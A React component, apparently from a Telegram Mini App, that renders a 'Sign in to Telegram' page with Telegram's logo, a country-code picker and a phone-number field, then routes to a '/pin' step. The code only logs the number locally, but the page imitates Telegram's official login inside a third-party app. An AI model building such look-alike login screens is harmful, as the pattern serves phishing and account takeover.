import {
    Select,
    Input,
    Button,
    Headline,
    Text,
    List,
  } from '@telegram-apps/telegram-ui';
  import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
  
  export const Home = () => {
    const countries = [
      { label: 'Vietnam', dialCode: '+84' },
      { label: 'China', dialCode: '+86' },
      { label: 'Japan', dialCode: '+81' },
    ];
  
    const [dialCode, setDialCode] = useState('+84');
    const [phone, setPhone] = useState('');
    const navigate = useNavigate();

    const handleClick = () => {
        console.log('Next step: ' + dialCode + "-"+ phone );

        // 自己路由到pin 码
        navigate('/pin');
    }
  
    return (
      // 使用 List 作为底色容器，确保背景统一为纯白或极浅灰
      <List style={{ 
        backgroundColor: 'var(--tgui--bg_color)', 
        minHeight: '100vh',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        padding: '40px 20px' 
      }}>
        
        {/* 1. Telegram Logo */}
        <div style={{ marginBottom: 24 }}>
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" 
            alt="Telegram" 
            style={{ width: 100, height: 100 }}
          />
        </div>
  
        {/* 2. 标题和描述 */}
        <div style={{ textAlign: 'center', marginBottom: 32 }}>
          <Headline weight="1" style={{ marginBottom: 8 }}>
            Sign in to Telegram
          </Headline>
          <Text style={{ color: 'var(--tgui--subtitle_text_color)', display: 'block' }}>
            Please confirm your country code <br /> and enter your phone number.
          </Text>
        </div>
  
        {/* 3. 输入区域：取消 Section，直接平铺组件以保持背景一致 */}
        <div style={{ width: '100%', maxWidth: 400 }}>
          <Select
            header="Country"
            value={dialCode}
            onChange={e => setDialCode(e.target.value)}
          >
            {countries.map(c => (
              <option key={c.dialCode} value={c.dialCode}>
                {c.label}
              </option>
            ))}
          </Select>
  
          <Input
            header="Phone Number"
            inputMode="tel"
            value={phone}
            onChange={e => setPhone(e.target.value)}
            before={<span style={{ marginRight: 8 }}
            >{dialCode}</span>}
          />
  
          {/* 4. 底部按钮 */}
          <Button
            mode="filled"
            size="l"
            stretched
            disabled={!phone}
            onClick={handleClick}
            style={{ 
              height: 50, 
              fontSize: 16, 
              fontWeight: 'bold',
              marginTop:16
            }}
          >
            NEXT
          </Button>
        </div>
      </List>
    );
  };